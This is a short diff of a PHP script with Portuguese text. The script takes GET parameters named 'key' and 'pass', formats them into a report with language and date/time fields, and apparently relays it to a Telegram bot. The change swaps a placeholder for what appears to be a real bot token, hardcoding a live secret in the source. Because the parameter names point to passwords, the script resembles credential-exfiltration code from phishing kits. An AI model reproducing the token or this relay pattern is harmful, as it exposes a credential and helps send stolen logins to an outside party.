@@ -42,7 +42,7 @@ if (isset($_GET['key']) && isset($_GET['pass']) && isset($_GET['val']) && isset(
         $conteudo .= "👥 | LINGUAGEM: $linguao\n";
         $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        
 
-        $botToken = 'seu token aqui';
+        $botToken = '8107256504:AAHfce8LiU6FYahdzTLH3zNKPFIN1FjIduA';
         
         $chatId = 'seu id aqui';
 
